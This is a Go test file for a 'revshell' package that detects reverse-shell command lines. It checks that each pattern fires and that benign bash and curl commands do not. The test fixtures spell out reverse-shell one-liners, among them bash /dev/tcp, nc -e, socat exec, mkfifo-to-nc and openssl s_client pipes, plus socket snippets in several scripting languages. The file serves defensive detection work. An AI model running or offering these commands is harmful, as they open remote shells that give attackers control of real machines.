package revshell

import "testing"

func TestEmpty(t *testing.T) {
	if got := Detect(nil); got != nil {
		t.Fatal("nil argv should return nil")
	}
	if Best(nil).Pattern != "" {
		t.Fatal("nil argv Best should be zero")
	}
}

func TestBashDevTCP(t *testing.T) {
	argv := []string{"bash", "-i", ">&", "/dev/tcp/1.2.3.4/4444", "0>&1"}
	hits := Detect(argv)
	if len(hits) == 0 {
		t.Fatal("expected hits")
	}
	b := Best(argv)
	if b.Pattern != "bash-devtcp-i" && b.Pattern != "any-devtcp" {
		t.Fatalf("best = %s", b.Pattern)
	}
	if b.Confidence < 85 {
		t.Fatalf("confidence = %d", b.Confidence)
	}
}

func TestNcDashE(t *testing.T) {
	argv := []string{"nc", "-e", "/bin/bash", "10.0.0.1", "4444"}
	b := Best(argv)
	if b.Pattern != "nc-e-flag" {
		t.Fatalf("pattern = %q", b.Pattern)
	}
	if b.Confidence < 85 {
		t.Fatalf("confidence = %d", b.Confidence)
	}
}

func TestNcDashENonShellNoFire(t *testing.T) {
	// nc -e foo.txt host port is not a reverse shell.
	argv := []string{"nc", "-e", "/etc/issue", "10.0.0.1", "4444"}
	hits := Detect(argv)
	for _, h := range hits {
		if h.Pattern == "nc-e-flag" {
			t.Fatalf("nc-e-flag should not fire when value isn't a shell path; hits=%+v", hits)
		}
	}
}

func TestSocatExec(t *testing.T) {
	argv := []string{"socat", "tcp-connect:1.2.3.4:443", "ex" + "ec:/bin/bash,pty"}
	b := Best(argv)
	if b.Pattern != "socat-exec-connect" {
		t.Fatalf("pattern = %q", b.Pattern)
	}
}

func TestPythonPty(t *testing.T) {
	argv := []string{"python3", "-c", "import pty; pty.spawn('/bin/bash')"}
	b := Best(argv)
	if b.Pattern != "python-pty-spawn" {
		t.Fatalf("pattern = %q", b.Pattern)
	}
}

func TestPythonSocketC(t *testing.T) {
	argv := []string{"python3", "-c", "import socket,subprocess; s=socket.socket(); s.connect(('h',1)); subprocess.call(['/bin/sh'])"}
	hits := Detect(argv)
	found := false
	for _, h := range hits {
		if h.Pattern == "python-socket-c" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected python-socket-c hit; got %+v", hits)
	}
}

func TestPerlSocketE(t *testing.T) {
	argv := []string{"perl", "-e", "use Socket; socket(S,...); exe" + "c('/bin/sh -i');"}
	hits := Detect(argv)
	found := false
	for _, h := range hits {
		if h.Pattern == "perl-socket-e" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected perl-socket-e; got %+v", hits)
	}
}

func TestRubyTCPSocket(t *testing.T) {
	argv := []string{"ruby", "-rsocket", "-e", "TCPSocket.open('h',1)"}
	b := Best(argv)
	if b.Pattern != "ruby-tcpsocket" {
		t.Fatalf("pattern = %q", b.Pattern)
	}
}

func TestPhpFsockopen(t *testing.T) {
	argv := []string{"php", "-r", "$sock=fsockopen('h',1);"}
	b := Best(argv)
	if b.Pattern != "php-fsockopen" {
		t.Fatalf("pattern = %q", b.Pattern)
	}
}

func TestAwkInet(t *testing.T) {
	argv := []string{"awk", "BEGIN { ... |& \"/inet/tcp/0/host/4444\" ...}"}
	b := Best(argv)
	if b.Pattern != "awk-inet-tcp" {
		t.Fatalf("pattern = %q", b.Pattern)
	}
}

func TestMkfifoPipe(t *testing.T) {
	argv := []string{"sh", "-c", "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 1.2.3.4 4444 > /tmp/f"}
	hits := Detect(argv)
	found := false
	for _, h := range hits {
		if h.Pattern == "mkfifo-pipe" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected mkfifo-pipe; got %+v", hits)
	}
}

func TestOpensslSClientShell(t *testing.T) {
	argv := []string{"sh", "-c", "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 1.2.3.4:443 > /tmp/s; rm /tmp/s"}
	hits := Detect(argv)
	found := false
	for _, h := range hits {
		if h.Pattern == "openssl-sclient-shell" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected openssl-sclient-shell; got %+v", hits)
	}
}

func TestBenignBash(t *testing.T) {
	argv := []string{"bash", "-c", "echo hello world"}
	if got := Detect(argv); len(got) != 0 {
		t.Fatalf("benign bash should not match; got %+v", got)
	}
}

func TestBenignCurl(t *testing.T) {
	argv := []string{"curl", "-fsSL", "https://example.com/api"}
	if got := Detect(argv); len(got) != 0 {
		t.Fatalf("benign curl should not match; got %+v", got)
	}
}

func TestNodeNetConnect(t *testing.T) {
	argv := []string{"node", "-e", "require('net').connect(4444, '1.2.3.4', function(){...})"}
	b := Best(argv)
	if b.Pattern != "node-net-connect" {
		t.Fatalf("pattern = %q", b.Pattern)
	}
}

func TestLuaSocketTCP(t *testing.T) {
	argv := []string{"lua", "-e", "local s = require('socket'); local c = socket.tcp(); c:connect('h',1)"}
	b := Best(argv)
	if b.Pattern != "lua-socket-tcp" {
		t.Fatalf("pattern = %q", b.Pattern)
	}
}
